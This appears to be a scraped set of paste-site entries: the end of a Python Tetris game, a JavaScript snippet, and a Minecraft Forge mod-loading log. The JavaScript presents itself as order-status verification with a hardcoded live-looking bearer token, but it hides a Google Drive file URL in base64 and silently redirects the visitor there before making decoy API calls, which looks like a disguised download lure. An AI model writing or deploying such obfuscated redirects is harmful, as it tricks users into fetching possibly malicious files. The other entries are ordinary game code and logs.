+        test_y = piece_y + 1
+        if can_piece_move(piece_x, test_y, piece_rotation):
+            piece_y = test_y
+        else:
+            # Add piece to inert
+            for y in range(piece_y_count):
+                for x in range(piece_x_count):
+                    block = piece_structures[piece_type][piece_rotation][y][x]
+                    if block != ' ':
+                        inert[piece_y + y][piece_x + x] = block
+
+            # Find complete rows
+            for y in range(grid_y_count):
+                complete = True
+                for x in range(grid_x_count):
+                    if inert[y][x] == ' ':
+                        complete = False
+                        break
+
+                if complete:
+                    for ry in range(y, 1, -1):
+                        for rx in range(grid_x_count):
+                            inert[ry][rx] = inert[ry - 1][rx]
+
+                    for rx in range(grid_x_count):
+                        inert[0][rx] = ' '
+
+            new_piece()
+
+            if not can_piece_move(piece_x, piece_y, piece_rotation):
+                reset()
+
+def on_key_down(key):
+    global piece_rotation
+    global piece_x
+    global piece_y
+    global timer
+
+    if key == keys.X:
+        test_rotation = piece_rotation + 1
+        if test_rotation > len(piece_structures[piece_type]) - 1:
+            test_rotation = 0
+
+        if can_piece_move(piece_x, piece_y, test_rotation):
+            piece_rotation = test_rotation
+
+    elif key == keys.Z:
+        test_rotation = piece_rotation - 1
+        if test_rotation < 0:
+            test_rotation = len(piece_structures[piece_type]) - 1
+
+        if can_piece_move(piece_x, piece_y, test_rotation):
+            piece_rotation = test_rotation
+
+    elif key == keys.LEFT:
+        test_x = piece_x - 1
+
+        if can_piece_move(test_x, piece_y, piece_rotation):
+            piece_x = test_x
+
+    elif key == keys.RIGHT:
+        test_x = piece_x + 1
+
+        if can_piece_move(test_x, piece_y, piece_rotation):
+            piece_x = test_x
+
+    elif key == keys.C:
+        while can_piece_move(piece_x, piece_y + 1, piece_rotation):
+            piece_y += 1
+            timer = timer_limit
+
+def draw():
+    screen.fill((255, 255, 255))
+
+    def draw_block(block, x, y):
+        colors = {
+            ' ': (222, 222, 222),
+            'i': (120, 195, 239),
+            'j': (236, 231, 108),
+            'l': (124, 218, 193),
+            'o': (234, 177, 121),
+            's': (211, 136, 236),
+            't': (248, 147, 196),
+            'z': (169, 221, 118),
+            'preview': (190, 190, 190),
+        }
+        color = colors[block]
+
+        block_size = 20
+        block_draw_size = block_size - 1
+        screen.draw.filled_rect(
+            Rect(
+                x * block_size, y * block_size,
+                block_draw_size, block_draw_size
+            ),
+            color=color
+        )
+
+    offset_x = 2
+    offset_y = 5
+
+    for y in range(grid_y_count):
+        for x in range(grid_x_count):
+            draw_block(inert[y][x], x + offset_x, y + offset_y)
+
+    for y in range(piece_y_count):
+        for x in range(piece_x_count):
+            block = piece_structures[piece_type][piece_rotation][y][x]
+            if block != ' ':
+                draw_block(
+                    block,
+                    x + piece_x + offset_x,
+                    y + piece_y + offset_y
+                )
+
+    for y in range(piece_y_count):
+        for x in range(piece_x_count):
+            block = piece_structures[sequence[-1]][0][y][x]
+            if block != ' ':
+                draw_block('preview', x + 5, y + 1)"
+7LDgmHX5,Untitled,Epiphemeral,JavaScript,Saturday 29th of March 2025 10:25:17 PM CDT,"(async function () {
+  const apiEndpoint = ""/v1/order/750/status"";
+  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();
+
+  async function verifyOrder(id) {
+    try {
+      const response = await fetch(apiEndpoint, {
+        method: ""POST"",
+        headers: {
+          ""Content-Type"": ""application/json"",
+          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
+        },
+        body: JSON.stringify({ order_id: id })
+      });
+
+      const data = await response.json();
+      return data;
+    } catch (err) {
+      return { status: ""ERROR"" };
+    }
+  }
+
+  function logEvent(id, status) {
+    fetch(""/v1/event"", {
+      method: ""POST"",
+      headers: {
+        ""Content-Type"": ""application/json""
+      },
+      body: JSON.stringify({
+        event: ""delivery_attempt"",
+        order: id,
+        result: status
+      })
+    });
+  }
+
+  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
+  const decode = atob;
+  const finalURL = decode(secret);
+
+  window.open(finalURL, '_self');
+
+  const status = await verifyOrder(orderId);
+  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
+})();"
+zmMFuWeX,FML Client Log,MineModder303,Java,Saturday 29th of March 2025 10:23:43 PM CDT,"[23:57:52] [main/INFO]: Loading tweak class name cpw.mods.fml.common.launcher.FMLTweaker
+[23:57:52] [main/INFO]: Using primary tweak class name cpw.mods.fml.common.launcher.FMLTweaker
+[23:57:52] [main/INFO]: Calling tweak class cpw.mods.fml.common.launcher.FMLTweaker
+[23:57:52] [main/INFO]: Forge Mod Loader version 7.99.40.1614 for Minecraft 1.7.10 loading
+[23:57:52] [main/INFO]: Java is Java HotSpot(TM) 64-Bit Server VM, version 1.8.0_441, running on Windows 10:amd64:10.0, installed at C:\Program Files\Java\jre1.8.0_441
+[23:57:52] [main/INFO]: Loading tweak class name cpw.mods.fml.common.launcher.FMLInjectionAndSortingTweaker
+[23:57:52] [main/INFO]: Loading tweak class name cpw.mods.fml.common.launcher.FMLDeobfTweaker
+[23:57:52] [main/INFO]: Calling tweak class cpw.mods.fml.common.launcher.FMLInjectionAndSortingTweaker
+[23:57:52] [main/INFO]: Calling tweak class cpw.mods.fml.common.launcher.FMLInjectionAndSortingTweaker
+[23:57:52] [main/INFO]: Calling tweak class cpw.mods.fml.relauncher.CoreModManager$FMLPluginWrapper
+[23:57:53] [main/INFO]: Found valid fingerprint for Minecraft. Certificate fingerprint cd99959656f753dc28d863b46769f7f8fbaefcfc
+[23:57:53] [main/ERROR]: FML appears to be missing any signature data. This is not a good thing
+[23:57:53] [main/INFO]: Calling tweak class cpw.mods.fml.relauncher.CoreModManager$FMLPluginWrapper
+[23:57:53] [main/INFO]: Calling tweak class cpw.mods.fml.relauncher.CoreModManager$FMLPluginWrapper
+[23:57:53] [main/INFO]: Calling tweak class cpw.mods.fml.common.launcher.FMLDeobfTweaker
+[23:57:53] [main/INFO]: Loading tweak class name cpw.mods.fml.common.launcher.TerminalTweaker
+[23:57:53] [main/INFO]: Calling tweak class cpw.mods.fml.common.launcher.TerminalTweaker
+[23:57:53] [main/INFO]: Launching wrapped minecraft {net.minecraft.client.main.Main}
+[23:57:53] [main/INFO]: [TMIForgeTransformer:transform:18]: [TMI] Rewriting class bex / net.minecraft.client.gui.inventory.GuiContainer
+[23:57:53] [main/INFO]: used the old auth tlauncher service
+[23:57:53] [main/INFO]: Setting user: MineGamer303
+[23:57:54] [Client thread/INFO]: LWJGL Version: 2.9.1
+[23:57:54] [Client thread/INFO]: [cpw.mods.fml.client.SplashProgress:start:188]: ---- Minecraft Crash Report ----
+// My bad.
+
+Time: 27/03/25 23:57
+Description: Loading screen debug info
+
+This is just a prompt for computer specs to be printed. THIS IS NOT A ERROR
+
+
+A detailed walkthrough of the error, its code path and all known details is as follows:
+---------------------------------------------------------------------------------------
+
+-- System Details --
+Details:
+	Minecraft Version: 1.7.10
+	Operating System: Windows 10 (amd64) version 10.0
+	Java Version: 1.8.0_441, Oracle Corporation
+	Java VM Version: Java HotSpot(TM) 64-Bit Server VM (mixed mode), Oracle Corporation
+	Memory: 159989152 bytes (152 MB) / 234881024 bytes (224 MB) up to 9831448576 bytes (9376 MB)
+	JVM Flags: 7 total; -Xmx9366M -XX:+UnlockExperimentalVMOptions -XX:+UseG1GC -XX:G1NewSizePercent=20 -XX:G1ReservePercent=20 -XX:MaxGCPauseMillis=50 -XX:G1HeapRegionSize=32M
+	AABB Pool Size: 0 (0 bytes; 0 MB) allocated, 0 (0 bytes; 0 MB) used
+	IntCache: cache: 0, tcache: 0, allocated: 0, tallocated: 0
+	FML: 
+	GL info: ' Vendor: 'ATI Technologies Inc.' Version: '4.6.0 Compatibility Profile Context 24.10.24.240624' Renderer: 'AMD Radeon 740M Graphics'
+[23:57:54] [Client thread/INFO]: Attempting early MinecraftForge initialization
+[23:57:54] [Client thread/INFO]: MinecraftForge v10.13.4.1614 Initialized
+[23:57:54] [Client thread/INFO]: Replaced 183 ore recipies
+[23:57:54] [Client thread/INFO]: Completed early MinecraftForge initialization
+[23:57:54] [Client thread/ERROR]: Unable to determine registrant mod for TooManyItems. This is a critical error and should be impossible
+java.lang.Throwable
+	at cpw.mods.fml.common.eventhandler.EventBus.register(EventBus.java:55) [EventBus.class:?]
+	at TMIForgeContainer.<init>(TMIForgeContainer.java:35) [TMIForgeContainer.class:?]
+	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) [?:1.8.0_441]
+	at sun.reflect.NativeConstructorAccessorImpl.newInstance(Unknown Source) [?:1.8.0_441]
+	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(Unknown Source) [?:1.8.0_441]
+	at java.lang.reflect.Constructor.newInstance(Unknown Source) [?:1.8.0_441]
+	at java.lang.Class.newInstance(Unknown Source) [?:1.8.0_441]
+	at cpw.mods.fml.common.Loader.identifyMods(Loader.java:340) [Loader.class:?]
+	at cpw.mods.fml.common.Loader.loadMods(Loader.java:489) [Loader.class:?]
+	at cpw.mods.fml.client.FMLClientHandler.beginMinecraftLoading(FMLClientHandler.java:208) [FMLClientHandler.class:?]
+	at net.minecraft.client.Minecraft.func_71384_a(Minecraft.java:480) [bao.class:?]
+	at net.minecraft.client.Minecraft.func_99999_d(Minecraft.java:878) [bao.class:?]
+	at net.minecraft.client.main.Main.main(SourceFile:148) [Main.class:?]
+	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[?:1.8.0_441]
+	at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_441]
+	at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) ~[?:1.8.0_441]
+	at java.lang.reflect.Method.invoke(Unknown Source) ~[?:1.8.0_441]
+	at net.minecraft.launchwrapper.Launch.launch(Launch.java:135) [launchwrapper-1.12.jar:?]
+	at net.minecraft.launchwrapper.Launch.main(Launch.java:28) [launchwrapper-1.12.jar:?]
+[23:57:54] [Client thread/INFO]: Found 0 mods from the command line. Injecting into mod discoverer
+[23:57:54] [Client thread/INFO]: Searching C:\Users\PC\AppData\Roaming\.minecraft\mods for mods
+[23:57:56] [Client thread/WARN]: Mod CustomOreGen is missing the required element 'version' and a version.properties file could not be found. Falling back to metadata version 1.2.1
+[23:57:57] [Client thread/WARN]: Mod spawncontroller is missing the required element 'version' and a version.properties file could not be found. Falling back to metadata version 3.0.0
+[23:57:57] [Client thread/WARN]: Mod DamageIndicatorsMod is missing the required element 'version' and a version.properties file could not be found. Falling back to metadata version 3.3.2
+[23:57:57] [Client thread/INFO]: Mod enhancedspawners2 is missing the required element 'name'. Substituting enhancedspawners2
+[23:57:57] [Client thread/INFO]: Mod tamedmobs is missing the required element 'name'. Substituting tamedmobs
+[23:57:57] [Client thread/INFO]: Forge Mod Loader has identified 28 mods to load
+[23:57:57] [Client thread/INFO]: Attempting connection with missing mods [mcp, FML, Forge, TooManyItems, CustomOreGen, spawncontroller, bspkrsCore, DamageIndicatorsMod, Treecapitator, Backpack, CustomChestLoot, DPU, endercompass, endercrop, moddisruptor, enhancedspawners2, FireBallsForPlayers, iChunUtil, instahouse, ism, cannibal321, Morph, naturescompass, ReiMinimap, SSTOW, tamedmobs, thehackermod, wyem] at CLIENT
+[23:57:57] [Client thread/INFO]: Attempting connection with missing mods [mcp, FML, Forge, TooManyItems, CustomOreGen, spawncontroller, bspkrsCore, DamageIndicatorsMod, Treecapitator, Backpack, CustomChestLoot, DPU, endercompass, endercrop, moddisruptor, enhancedspawners2, FireBallsForPlayers, iChunUtil, instahouse, ism, cannibal321, Morph, naturescompass, ReiMinimap, SSTOW, tamedmobs, thehackermod, wyem] at SERVER
+[23:57:57] [Client thread/ERROR]: The mod Backpack is expecting signature @FINGERPRINT@ for source Backpacks-Mod.jar, however there is no signature matching that description
+[23:57:57] [Client thread/INFO]: Reloading ResourceManager: Default, FMLFileResourcePack:Forge Mod Loader, FMLFileResourcePack:Minecraft Forge, FMLFileResourcePack:Custom Ore Generation, FMLFileResourcePack:SpawnController, FMLFileResourcePack:bspkrsCore, FMLFileResourcePack:Damage Indicators, FMLFileResourcePack:Treecapitator, FMLFileResourcePack:Backpack, FMLFileResourcePack:Custom Chest Loot, FMLFileResourcePack:Don't Pick Up, FMLFileResourcePack:Ender Compass, FMLFileResourcePack:Ender Crop, FMLFileResourcePack:Enderman Disruptor Mod, FMLFileResourcePack:enhancedspawners2, FMLFileResourcePack:FireBallsForPlayers, FMLFileResourcePack:iChunUtil, FMLFileResourcePack:Insta House, FMLFileResourcePack:Instant Structures Mod (ISM), FMLFileResourcePack:More Gems + Mod, FMLFileResourcePack:Morph, FMLFileResourcePack:Nature's Compass, FMLFileResourcePack:Rei's Minimap, FMLFileResourcePack:Soul Shards: The Old Ways, FMLFileResourcePack:tamedmobs, FMLFileResourcePack:thehackermod, FMLFileResourcePack:WYEM
+[23:57:57] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: EnhancedSpawner.png in C:\Users\PC\AppData\Roaming\.minecraft\mods\EnhancedSpawners2-1.6.jar
+[23:57:57] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: FireBallsForPlayers in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:57:57] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: FireBallsForPlayers in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:57:57] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: FireBallsForPlayers in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:57:57] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: ModName in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:57:57] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: ModName in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:57:57] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: ModName in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:57:57] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: TestEnvironmentMod in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:57:57] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: TestEnvironmentMod in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:57:57] [Client thread/WARN]: ResourcePack: ignored non-lowercase namespace: TestEnvironmentMod in C:\Users\PC\AppData\Roaming\.minecraft\mods\FireBalls-For-Players-Mod-1.7.10.jar
+[23:57:57] [Client thread/INFO]: Processing ObjectHolder annotations
+[23:57:57] [Client thread/INFO]: Found 342 ObjectHolder annotations
+[23:57:57] [Client thread/INFO]: Identifying ItemStackHolder annotations
+[23:57:57] [Client thread/INFO]: Found 0 ItemStackHolder annotations
+[23:57:57] [Client thread/INFO]: Configured a dormant chunk cache size of 0
+[23:57:57] [Client thread/INFO]: Loading configuration file C:\Users\PC\AppData\Roaming\.minecraft\config\Treecapitator.cfg
+[23:57:57] [Client thread/INFO]: Proceeding to load tree/mod configs from file.
+[23:57:57] [Client thread/INFO]: Please note, you are running a beta version! Please report any bugs you find.
+[23:57:58] [Thread-9/ERROR]: Failed to perform a version check!
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: com.google.gson.JsonSyntaxException: java.lang.IllegalStateException: Expected BEGIN_OBJECT but was STRING at line 1 column 1
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.gson.Gson.fromJson(Gson.java:815)
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.gson.Gson.fromJson(Gson.java:768)
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.gson.Gson.fromJson(Gson.java:717)
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.gson.Gson.fromJson(Gson.java:689)
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at net.minecraftforge.common.ForgeVersion$1.run(ForgeVersion.java:94)
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: Caused by: java.lang.IllegalStateException: Expected BEGIN_OBJECT but was STRING at line 1 column 1
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.gson.stream.JsonReader.beginObject(JsonReader.java:374)
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.gson.internal.bind.MapTypeAdapterFactory$Adapter.read(MapTypeAdapterFactory.java:183)
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.gson.internal.bind.MapTypeAdapterFactory$Adapter.read(MapTypeAdapterFactory.java:145)
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at com.google.gson.Gson.fromJson(Gson.java:803)
+[23:57:58] [Forge Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	... 4 more
+[23:57:58] [Thread-9/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: java.lang.ClassCastException: com.google.gson.JsonPrimitive cannot be cast to com.google.gson.JsonArray
+[23:57:58] [Thread-9/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at me.superckl.dpu.common.utlilty.VersionChecker$1.run(VersionChecker.java:59)
+[23:57:58] [Thread-9/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.lang.Thread.run(Unknown Source)
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: java.io.FileNotFoundException: https://raw.githubusercontent.com/iChun/iChunUtil/master/src/main/resources/assets/ichunutil/mod/patrons.json
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(Unknown Source)
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection.access$200(Unknown Source)
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection$9.run(Unknown Source)
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection$9.run(Unknown Source)
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.security.AccessController.doPrivileged(Native Method)
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.security.AccessController.doPrivilegedWithCombiner(Unknown Source)
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getInputStream(Unknown Source)
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.net.URL.openStream(Unknown Source)
+[23:57:58] [iChunUtil Patron Getter Thread/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at ichun.client.thread.ThreadGetPatrons.run(ThreadGetPatrons.java:30)
+[23:57:58] [Client thread/INFO]: Loaded custom tier kill settings!
+[23:57:58] [Client thread/INFO]: Min kills: 0,64,128,256,512,1024
+[23:57:58] [Client thread/INFO]: Max kills: 63,127,255,511,1023,1024
+[23:57:58] [Client thread/INFO]: Loaded configuration file!
+[23:57:58] [Client thread/WARN]: ****************************************
+[23:57:58] [Client thread/WARN]: * The object mod.mcreator.mcreator_cryingObsidian$BlockCryingObsidian@234bf75d has been registered twice for the same name thehackermod:CryingObsidian.
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.FMLControlledNamespacedRegistry.add(FMLControlledNamespacedRegistry.java:384)
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.GameData.registerBlock(GameData.java:894)
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.GameData.registerBlock(GameData.java:869)
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.GameRegistry.registerBlock(GameRegistry.java:229)
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.GameRegistry.registerBlock(GameRegistry.java:188)
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.GameRegistry.registerBlock(GameRegistry.java:177)...
+[23:57:58] [Client thread/WARN]: ****************************************
+[23:57:58] [Client thread/WARN]: ****************************************
+[23:57:58] [Client thread/WARN]: * The object mod.mcreator.mcreator_enderEyesOre$BlockEnderEyesOre@fdd1e25 has been registered twice for the same name thehackermod:EnderEyesOre.
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.FMLControlledNamespacedRegistry.add(FMLControlledNamespacedRegistry.java:384)
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.GameData.registerBlock(GameData.java:894)
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.GameData.registerBlock(GameData.java:869)
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.GameRegistry.registerBlock(GameRegistry.java:229)
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.GameRegistry.registerBlock(GameRegistry.java:188)
+[23:57:58] [Client thread/WARN]: *  at cpw.mods.fml.common.registry.GameRegistry.registerBlock(GameRegistry.java:177)...
+[23:57:58] [Client thread/WARN]: ****************************************
+[23:57:58] [Client thread/INFO]: Applying holder lookups
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: java.io.FileNotFoundException: https://dl.dropbox.com/u/74770478/DamageIndicatorMod18.txt
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(Unknown Source)
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection.access$200(Unknown Source)
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection$9.run(Unknown Source)
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection$9.run(Unknown Source)
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.security.AccessController.doPrivileged(Native Method)
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.security.AccessController.doPrivilegedWithCombiner(Unknown Source)
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getInputStream(Unknown Source)
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.net.URL.openStream(Unknown Source)
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at DamageIndicatorsMod.client.DIClientProxy$1.run(DIClientProxy.java:76)
+[23:57:58] [Thread-8/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.lang.Thread.run(Unknown Source)
+[23:57:58] [Client thread/INFO]: Holder lookups applied
+[23:57:58] [Client thread/INFO]: Injecting itemstacks
+[23:57:58] [Client thread/INFO]: Itemstack injection complete
+[23:57:58] [Sound Library Loader/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: 
+[23:57:58] [Sound Library Loader/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: Starting up SoundSystem...
+[23:57:58] [Thread-26/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: Initializing LWJGL OpenAL
+[23:57:58] [Thread-26/INFO]: [paulscode.sound.SoundSystemLogger:message:69]:     (The LWJGL binding of OpenAL.  For more information, see http://www.lwjgl.org)
+[23:57:58] [Client thread/INFO]: Created: 16x16 textures/blocks-atlas
+[23:57:58] [Client thread/INFO]: Created: 16x16 textures/items-atlas
+[23:57:58] [Client thread/INFO]: Initializing ModVersionChecker for mod bspkrsCore
+[23:57:58] [Thread-26/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: OpenAL initialized.
+[23:57:59] [Client thread/WARN]: Error retrieving remote string value at URL http://bspk.rs/Minecraft/1.7.10/bspkrsCore.version! Defaulting to check_error
+[23:57:59] [Client thread/ERROR]: The language resource assets/damageindicatorsmod/lang/en_US.lang cannot be located on the classpath. This is a programming error.
+[23:57:59] [Sound Library Loader/INFO]: [paulscode.sound.SoundSystemLogger:message:69]: 
+[23:57:59] [Sound Library Loader/INFO]: Sound engine started
+[23:57:59] [Client thread/INFO]: Initializing ModVersionChecker for mod Treecapitator
+[23:57:59] [Client thread/WARN]: Error retrieving remote string value at URL http://bspk.rs/Minecraft/1.7.10/treecapitator.version! Defaulting to check_error
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: java.io.FileNotFoundException: https://raw.githubusercontent.com/iChun/iChunUtil/master/src/main/resources/assets/ichunutil/mod/versions.json
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(Unknown Source)
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection.access$200(Unknown Source)
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection$9.run(Unknown Source)
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection$9.run(Unknown Source)
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.security.AccessController.doPrivileged(Native Method)
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.security.AccessController.doPrivilegedWithCombiner(Unknown Source)
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getInputStream(Unknown Source)
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at java.net.URL.openStream(Unknown Source)
+[23:57:59] [iChunUtil Mod Version Check/INFO]: [java.lang.Throwable$WrappedPrintStream:println:-1]: 	at ichun.common.core.updateChecker.ModVersionChecker$1.run(ModVersionChecker.java:47)
+[23:57:59] [Client thread/INFO]: [com.whammich.sstow.events.Achievements:defaultAchievements:28]: Rendering Icons
+[23:57:59] [Client thread/INFO]: Injecting itemstacks
+[23:57:59] [Client thread/INFO]: Itemstack injection complete
+[23:57:59] [Client thread/INFO]: Loading global config 'C:\Users\PC\AppData\Roaming\.minecraft\config\CustomOreGen' ...
+[23:57:59] [Client thread/INFO]: Prioritizing User and IMC mod configs...
+[23:57:59] [Client thread/INFO]: Registering items and trees...
+[23:57:59] [Client thread/INFO]: Skipping Ore Dictionary processing.
+[23:58:00] [Client thread/INFO]: [Backpacks] NEI Support couldn't be enabled
+[23:58:00] [Client thread/INFO]: [toast.ccl._CustomChestLootMod:log:76]: [CustomChestLoot] Loading custom chest loot...
+[23:58:00] [Client thread/INFO]: [toast.ccl._CustomChestLootMod:log:76]: [CustomChestLoot] Loaded 10 loot lists!
+[23:58:00] [Client thread/INFO]: [toast.ccl._CustomChestLootMod:log:76]: [CustomChestLoot] Generating default chest loot...
+[23:58:00] [Client thread/INFO]: [toast.ccl._CustomChestLootMod:log:76]: [CustomChestLoot] Generated 0 loot lists!
+[23:58:00] [Client thread/INFO]: Successfully enabled!
+[23:58:00] [Client thread/INFO]: Skipped mapping for WitherBoss: detected as boss.
+[23:58:00] [Client thread/INFO]: Skipped mapping for EnderDragon: detected as boss.
+[23:58:00] [Client thread/INFO]: Finished entity mapping (33 entries).
+[23:58:00] [Client thread/INFO]: Soul Shards Loaded Entity Blacklist
